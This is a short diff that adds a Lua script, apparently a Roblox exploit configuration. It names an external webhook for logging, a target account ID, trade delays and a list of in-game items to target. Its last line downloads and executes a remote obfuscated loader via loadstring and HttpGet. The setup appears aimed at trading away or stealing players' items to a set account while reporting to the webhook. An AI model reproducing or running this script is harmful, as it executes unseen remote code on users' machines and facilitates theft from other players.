@@ -1,0 +1,10 @@
+getgenv().WEBHOOK_URL = "https://skama.net/api/logs/webhook/mrr_34bc3896babe4b48b18db90fe69b8e7a"
+getgenv().TARGET_ID = 4297278915
+getgenv().DELAY_STEP = 1      
+getgenv().TRADE_CYCLE_DELAY = 2 
+getgenv().TARGET_BRAINROTS = {
+    ["Orcaledon"] = true,
+    ["Tang Tang Keletang"] = true,
+    ["Garama and Madundung"] = true
+}
+loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/9a91b3ba6fb71423853ec2f885c42d67.lua"))()
